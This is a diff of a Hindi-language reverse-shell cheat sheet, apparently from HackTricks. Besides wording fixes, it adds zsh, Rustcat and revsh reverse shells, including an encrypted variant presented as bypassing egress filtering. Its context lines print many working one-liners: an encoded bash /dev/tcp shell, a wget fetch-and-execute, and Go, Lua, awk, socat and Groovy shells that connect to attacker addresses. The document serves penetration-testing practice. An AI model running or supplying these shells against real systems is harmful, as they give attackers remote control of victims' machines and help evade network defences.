@@ -34,11 +34,11 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 ```
 #### Shell explanation
 
-1. **`bash -i`**: इस कमांड का यह भाग एक इंटरैक्टिव (`-i`) Bash शेल शुरू करता है।
-2. **`>&`**: इस कमांड का यह भाग **मानक आउटपुट** (`stdout`) और **मानक त्रुटि** (`stderr`) को **एक ही गंतव्य** पर पुनर्निर्देशित करने के लिए एक संक्षिप्त नोटेशन है।
+1. **`bash -i`**: यह कमांड का हिस्सा एक इंटरैक्टिव (`-i`) Bash शेल शुरू करता है।
+2. **`>&`**: यह कमांड का हिस्सा **मानक आउटपुट** (`stdout`) और **मानक त्रुटि** (`stderr`) को **एक ही गंतव्य** पर पुनर्निर्देशित करने के लिए एक संक्षिप्त नोटेशन है।
 3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: यह एक विशेष फ़ाइल है जो **निर्दिष्ट IP पते और पोर्ट के लिए एक TCP कनेक्शन का प्रतिनिधित्व करती है**।
 - **इस फ़ाइल पर आउटपुट और त्रुटि धाराओं को पुनर्निर्देशित करके**, कमांड प्रभावी रूप से इंटरैक्टिव शेल सत्र का आउटपुट हमलावर की मशीन पर भेजता है।
-4. **`0>&1`**: इस कमांड का यह भाग **मानक इनपुट (`stdin`) को मानक आउटपुट (`stdout`) के समान गंतव्य पर पुनर्निर्देशित करता है**।
+4. **`0>&1`**: यह कमांड का हिस्सा **मानक इनपुट (`stdin`) को मानक आउटपुट (`stdout`) के समान गंतव्य पर पुनर्निर्देशित करता है**।
 
 ### Create in file and execute
 ```bash
@@ -47,7 +47,7 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Forward Shell
 
-जब एक Linux-आधारित वेब एप्लिकेशन में **Remote Code Execution (RCE)** कमजोरियों का सामना कर रहे हों, तो एक रिवर्स शेल प्राप्त करना नेटवर्क सुरक्षा जैसे iptables नियमों या जटिल पैकेट फ़िल्टरिंग तंत्रों द्वारा बाधित हो सकता है। ऐसे सीमित वातावरण में, एक वैकल्पिक दृष्टिकोण एक PTY (Pseudo Terminal) शेल स्थापित करना है ताकि समझौता किए गए सिस्टम के साथ अधिक प्रभावी ढंग से बातचीत की जा सके।
+जब एक Linux-आधारित वेब एप्लिकेशन में **Remote Code Execution (RCE)** सुरक्षा कमजोरी का सामना कर रहे हों, तो एक रिवर्स शेल प्राप्त करना नेटवर्क सुरक्षा उपायों जैसे iptables नियमों या जटिल पैकेट फ़िल्टरिंग तंत्रों द्वारा बाधित हो सकता है। ऐसे सीमित वातावरण में, एक वैकल्पिक दृष्टिकोण एक PTY (Pseudo Terminal) शेल स्थापित करना है ताकि समझौता किए गए सिस्टम के साथ अधिक प्रभावी ढंग से बातचीत की जा सके।
 
 इस उद्देश्य के लिए एक अनुशंसित उपकरण [toboggan](https://github.com/n3rada/toboggan.git) है, जो लक्षित वातावरण के साथ बातचीत को सरल बनाता है।
 
@@ -169,7 +169,7 @@ attacker> ncat -l <port,eg.443> --ssl
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
-## लुआ
+## Lua
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -219,6 +219,48 @@ or
 
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
+## Zsh (बिल्ट-इन TCP)
+```bash
+# Requires no external binaries; leverages zsh/net/tcp module
+zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
+```
+## Rustcat (rcat)
+
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – आधुनिक netcat-जैसा श्रोता जो Rust में लिखा गया है (2024 से Kali में पैक किया गया)।
+```bash
+# Attacker – interactive TLS listener with history & tab-completion
+rcat listen -ib 55600
+
+# Victim – download static binary and connect back with /bin/bash
+curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_64 -o /tmp/rcat \
+&& chmod +x /tmp/rcat \
+&& /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
+```
+विशेषताएँ:
+- एन्क्रिप्टेड ट्रांसपोर्ट (TLS 1.3) के लिए वैकल्पिक `--ssl` ध्वज
+- पीड़ित पर किसी भी बाइनरी (जैसे `/bin/sh`, `python3`) को उत्पन्न करने के लिए `-s`
+- पूरी तरह से इंटरैक्टिव PTY में स्वचालित रूप से अपग्रेड करने के लिए `--up`
+
+## revsh (एन्क्रिप्टेड और पिवट-तैयार)
+
+`revsh` एक छोटा C क्लाइंट/सर्वर है जो एक **एन्क्रिप्टेड डिफी-हेलमैन टनल** के माध्यम से पूर्ण TTY प्रदान करता है और वैकल्पिक रूप से रिवर्स VPN-जैसे पिवटिंग के लिए एक **TUN/TAP** इंटरफेस संलग्न कर सकता है।
+```bash
+# Build (or grab a pre-compiled binary from the releases page)
+git clone https://github.com/emptymonkey/revsh && cd revsh && make
+
+# Attacker – controller/listener on 443 with a pinned certificate
+revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem
+
+# Victim – reverse shell over TLS to the attacker
+./revsh <ATTACKER-IP>:443
+```
+उपयोगी ध्वज:
+- `-b` : रिवर्स के बजाय बाइंड-शेल
+- `-p socks5://127.0.0.1:9050` : TOR/HTTP/SOCKS के माध्यम से प्रॉक्सी
+- `-t` : एक TUN इंटरफेस बनाएं (रिवर्स VPN)
+
+क्योंकि पूरा सत्र एन्क्रिप्टेड और मल्टीप्लेक्स्ड है, यह अक्सर सरल ईग्रेस फ़िल्टरिंग को बायपास कर देता है जो एक साधारण पाठ `/dev/tcp` शेल को समाप्त कर देगा।
+
 ## OpenSSL
 
 हमलावर (Kali)
@@ -249,7 +291,7 @@ attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
 attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
-## awk
+## Awk
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
@@ -296,7 +338,7 @@ close(Service)
 ```bash
 xterm -display 10.0.0.1:1
 ```
-रिवर्स शेल को पकड़ने के लिए आप इसका उपयोग कर सकते हैं (जो पोर्ट 6001 पर सुनता है):
+रिवर्स शेल को पकड़ने के लिए आप (जो पोर्ट 6001 पर सुनता है) का उपयोग कर सकते हैं:
 ```bash
 # Authorize host
 xhost +targetip
@@ -305,7 +347,7 @@ Xnest :1
 ```
 ## Groovy
 
-by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) नोट: Java reverse shell Groovy के लिए भी काम करता है
+by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) नोट: Java reverse shell भी Groovy के लिए काम करता है
 ```bash
 String host="localhost";
 int port=8044;
@@ -318,5 +360,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 - [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
 - [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [https://github.com/robiot/rustcat](https://github.com/robiot/rustcat)
+- [https://github.com/emptymonkey/revsh](https://github.com/emptymonkey/revsh)
 
 {{#include ../../banners/hacktricks-training.md}}
